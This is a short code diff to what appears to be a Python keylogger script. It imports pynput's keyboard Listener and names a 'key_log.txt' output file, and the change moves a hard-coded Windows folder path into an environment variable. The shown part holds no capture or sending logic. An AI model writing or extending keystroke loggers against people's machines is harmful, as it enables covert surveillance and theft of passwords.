@@ -1,8 +1,11 @@
 import time
+import os
 from pynput.keyboard import Key, Listener
 import threading
+from dotenv import load_dotenv
+load_dotenv()  
 
-file_path = "C:\\Users\\PC-Service\\OneDrive\\Desktop\\project\\files\\"
+file_path = os.getenv("FILE_PATH")
 extend = "\\"
 keys_information = "key_log.txt"
 
